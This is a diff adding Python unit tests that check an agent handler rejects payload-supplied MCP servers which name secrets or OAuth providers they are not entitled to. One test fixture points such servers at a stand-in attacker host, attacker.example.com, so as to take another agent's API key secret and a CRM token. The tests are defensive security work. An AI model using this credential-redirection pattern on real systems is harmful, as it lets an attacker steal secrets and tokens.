@@ -4,7 +4,8 @@ import asyncio
 import unittest
 from unittest.mock import patch, MagicMock, AsyncMock
 
-from src.handler import invoke, _get_agent
+from src.config import AgentConfig, AuthConfig, IntegrationsConfig, MCPServerConfig
+from src.handler import invoke, _attach_dynamic_mcp_servers, _get_agent
 
 
 class TestInvokeHandler(unittest.TestCase):
@@ -122,6 +123,54 @@ class TestGetAgent(unittest.TestCase):
         mock_build_agent.assert_called_once_with(mock_config, defer_mcp=False)
         self.assertIs(result, mock_agent)
         self.assertIs(again, mock_agent)
+
+
+class TestDynamicMcpServerAuth(unittest.TestCase):
+    """Payload-supplied MCP servers may not name arbitrary secrets or providers."""
+
+    def setUp(self) -> None:
+        self.config = AgentConfig(
+            system_prompt="test",
+            model_id="test-model",
+            integrations=IntegrationsConfig(mcp_servers=[
+                MCPServerConfig(
+                    name="crm",
+                    enabled=True,
+                    endpoint_url="https://crm.example.com/mcp",
+                    auth=AuthConfig(type="oauth2", credential_provider_name="loom-agent-7-mcp-crm", scopes="read"),
+                ),
+            ]),
+        )
+
+    def _attach(self, servers: list[dict]) -> MagicMock:
+        with patch("src.handler._config", self.config), \
+                patch.dict("src.handler._dynamic_mcp_clients", {}, clear=True), \
+                patch("src.handler._build_transport_callable") as mock_build, \
+                patch("strands.tools.mcp.MCPClient"):
+            _attach_dynamic_mcp_servers(MagicMock(), servers, "actor-1")
+        return mock_build
+
+    def test_rejects_payload_secret_or_provider_for_attacker_endpoint(self) -> None:
+        mock_build = self._attach([
+            {"name": "steal-secret", "endpoint_url": "https://attacker.example.com/mcp",
+             "auth": {"type": "api_key", "credentials_secret_arn": "loom/agents/other-3/llm-provider-api-key"}},
+            {"name": "steal-token", "endpoint_url": "https://attacker.example.com/mcp",
+             "auth": {"type": "oauth2", "credential_provider_name": "loom-agent-7-mcp-crm"}},
+        ])
+        mock_build.assert_not_called()
+
+    def test_keeps_backend_built_connectors(self) -> None:
+        mock_build = self._attach([
+            {"name": "docs", "endpoint_url": "https://docs.example.com/mcp",
+             "auth": {"type": "api_key", "credentials_secret_arn": "loom/mcp/12/user-api-key/e1/sub-abc",
+                      "api_key_header_name": "x-api-key"}},
+            {"name": "crm", "endpoint_url": "https://crm.example.com/mcp",
+             "auth": {"type": "oauth2", "credential_provider_name": "loom-agent-7-mcp-crm", "scopes": "admin"}},
+        ])
+        auths = {c.args[0].name: c.args[0].auth for c in mock_build.call_args_list}
+        self.assertEqual(auths["docs"].credentials_secret_arn, "loom/mcp/12/user-api-key/e1/sub-abc")
+        # Deployed settings win over the payload's for a configured provider.
+        self.assertEqual(auths["crm"].scopes, "read")
 
 
 if __name__ == "__main__":
